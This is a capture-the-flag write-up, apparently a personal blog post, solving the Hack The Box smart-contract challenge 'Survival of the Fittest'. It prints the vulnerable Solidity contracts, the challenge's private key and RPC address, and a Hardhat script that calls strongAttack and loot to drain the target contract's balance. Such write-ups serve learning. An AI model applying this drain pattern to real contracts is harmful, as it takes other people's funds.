---
layout: post
title:  "[Challenge] HTB - Survival of the Fittest"
date:   2023-07-21 00:21:16 -0300
categories: jekyll update
---

Today we gonna solve the challenge "Survival of the Fittest" from hack the box website

### So lets start, here is the challenge description : 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/e85672af-61ac-46c2-b285-963b6c1f0931)

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/8b8a2df3-41da-459b-a616-c436366dfd6e)

### After download we have the next smart contracts :

Setup.sol
This smart contract is used to check if the challenge is solved to get the flag, we can check it using the "isSolved" function
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

Creature.sol ( The Target )
This is the target, we need to use the strongAttack function to decrease the life of the creature to `0` and then claim the `loot`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

So let me try to draw a simple flow to understand better the situation to solve the challenge
![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/608157d9-8ce7-47e5-9740-b348f88181fa)


So cool we have the solution but ... how exaclty we can connect and interact with this smart contract to get the flag ?, lets see more information about the challenge

If wee can see here is an ip, lets see what happend if i paste this in the browser 
![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/05bb99be-6a15-44ff-9c16-3b5e9e0d6f03)
So we see is a game, but if we try to play we never gonna win, or may be i am so bad xD, so lets press the `connection` button

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/c45d5299-082c-46be-b15b-752064840df4)
Sooo here are the connection data, but if you come from blockchain may be your first reaction is gonna be like `What the heck` and `Why the private key are there`, please calm down bro is a simple challenge xD

So now we have the connection data, we need to do a method to interact with the smart contracts and the `RPC` url, but `WHERE IS THE URL BRO`, i dont know lets look around
![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/b2b784b9-26b4-43d6-bbfe-0efbe3717a77)
There it is, in the `Doc` button we can see the url is the `http://${ip_challenge}/rpc`

We have now the `Data` and the `RPC` url to interact, so now we need build the script to try to solve the challenge, here you have multiple choices and to be honestly you can pick whatever prefeer that is more easy for you

### Instalation and configuration
in this case i create a `hardhat` project to solve it, we can start one using :

```shell
npx hardhat
```
This open an interactive menu that you can use to select whatever you prefer

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/8ea60d61-d6b4-4b4f-8d37-45d2c6be1a42)

After this we need to put the smart contracts into the `/contract` folder

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/2be0cdd4-97a3-41f4-a095-dd1e4f18b766)

lets compile now using the next command
```shell
npx hardhat compile
```
So now we can start intreact with the smart contract, but first we need to define some values before

Install dotenv
```shell
npm install dotenv
```

### .env
Lets create a `.env` file with the values that i get from the challenge

```env
# This values are used to interact with the smart contract
PRIV_KEY='0x8a1e240e537249a1a985526847d8cd49cf87fd5d03829786164cca3d9980e140'
ADDRESS='0x44f4C750F5e7eF25F92C65Acb70Fa0fAa0Ff1656'
TARGET_ADDRESS='0x6faC03B8B20AAb7126De00D557AB68d1B1524136'
SETUP_ADDRESS='0xbDE31A327fa7143D4511B23e4753f6269eD6d01B'
RPC_URL='http://143.110.169.131:30914/rpc'
```


### hardhat.config.js
Lets edit the `hardhat.config.js` file

```javascript
require("@nomicfoundation/hardhat-toolbox");
require('dotenv').config();

const { PRIV_KEY, RPC_URL } = process.env;

/** @type import('hardhat/config').HardhatUserConfig */
module.exports = {
  solidity: "0.8.19",
  networks: {
    htb: {
      url: RPC_URL,
      accounts: [PRIV_KEY]
    }
  }
};
```

So Now wee have all the things to start the script to solve the challenge
Lets create a script called `htb_flag.js` in the `/test/` folder
```javascript
/*
    This script connect to the target and run the 
    functions needed to get the htb flag
*/

const { expect } = require('chai');
require('dotenv').config();

// .Env data to interact with the smart contracts
const {
    PRIV_KEY,
    ADDRESS,
    TARGET_ADDRESS,
    SETUP_ADDRESS
} = process.env;

// Smart contract names
const SETUP = 'Setup';
const TARGET = 'Creature';

describe("HTB flag flow :)", function () {

    let contractSetup;
    let contractTarget;

    it('[ Instantiate ] Setup.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(SETUP);
        contractSetup = await Contract.attach(SETUP_ADDRESS);
        expect(contractSetup.target).to.be.equal(SETUP_ADDRESS);

    });

    it('[ Instantiate ] Creature.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(TARGET);
        contractTarget = await Contract.attach(TARGET_ADDRESS);
        expect(contractTarget.target).to.be.equal(TARGET_ADDRESS);

    });

    it('[ Target ] Check the life before attack', async () => {

        const response = await contractTarget.lifePoints();
        console.log('Life points before => ', response);

    });

    it('[ Target ] Using the function "strongAttack"', async () => {

        const response = await contractTarget.strongAttack(20);
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Target ] Getting the loot, yeah boy :)', async () => {

        const response = await contractTarget.loot();
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Target ] Re-Check the life to be == 0', async () => {

        const response = await contractTarget.lifePoints();
        expect(response).to.be.equal(0);

    });

    it('[ Setup ] Checking if is solved', async () => {

        const response = await contractSetup.isSolved();
        console.log('Is solved ? : ', response);
        expect(response).to.be.equal(true);

    });

});

```

Understand the flow is easy because this script does the mentioned before in the image flow interaction

So lets do the magic trick using the next command
```shell
npx hardhat test --network htb
```
if you can see we use `--network htb` this means we are using the network configurated in the `hardhat.config.js` file

And the results are
![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/0d9386f8-602a-4e93-ae3a-fa20914805f8)
And is solved, so now wee need to go to the `url/flag` to get the flag :) 

Note : If you like look the details you can see the test take much time, and the reason of this is because all the functions runned in blockchain needs to be confirmed be a node first :)

So stop wasting time, lets GO FOR THE FLAG XD 
![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/09d3849a-a789-44ce-a4ca-9a11dc3dd4f8)


So thats it, we did it

<img src="https://media.tenor.com/_QHjTe6Ss9UAAAAd/dancing-lizard.gif" width="300" height="300" >
